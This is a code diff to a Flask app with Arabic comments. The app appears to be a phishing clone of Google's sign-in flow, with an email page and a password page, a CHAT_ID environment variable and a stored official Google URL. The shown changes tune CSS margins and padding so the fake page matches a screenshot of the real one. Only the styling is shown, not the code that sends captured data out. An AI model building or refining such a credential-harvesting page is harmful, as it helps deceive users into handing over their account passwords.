@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: إنزال "إنشاء حساب" للنقطة السوداء وزر "التالي" للخط الأسود
+# الصفحة الأولى: ضبط دقيق جداً لموقع "إنشاء حساب" و"التالي" بناءً على صورتك الأخيرة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -125,9 +125,9 @@ def step1():
         }
         .links-container a:hover { text-decoration: underline; }
 
-        /* إنزال كلمة "إنشاء حساب" بالمسافة المطلوبة لتصل للنقطة السوداء */
+        /* تم رفع "إنشاء حساب" قليلاً لتستقر عند النقطة السوداء تماماً */
         .create-account-link {
-            margin-top: 35px; 
+            margin-top: 18px; 
         }
 
         .footer-action {
@@ -136,7 +136,7 @@ def step1():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 20px; /* إنزال زر التالي للأسفل ليطابق الخط الأسود السفلي */
+            padding-bottom: 75px; /* تم رفع زر التالي للأعلى ليطابق الخط الأسود تماماً */
         }
 
         .submit-btn {
@@ -192,7 +192,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور مع نفس التنسيق والشروط
+# الصفحة الثانية: إدخال كلمة المرور مع الشروط والتنسيق المتناسق
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -317,7 +317,7 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 20px;
+            padding-bottom: 75px;
         }
 
         .submit-btn {
